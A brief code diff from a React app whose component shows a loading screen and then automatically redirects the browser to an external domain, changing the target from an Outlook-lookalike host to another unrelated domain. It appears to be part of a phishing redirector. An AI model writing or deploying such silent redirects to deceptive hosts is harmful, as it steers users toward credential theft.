@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outblook.adabrax.com';
+            window.location.href = 'https://often.distrogaz.com.ar';
         }, 2000);
 
         return () => clearTimeout(timer);
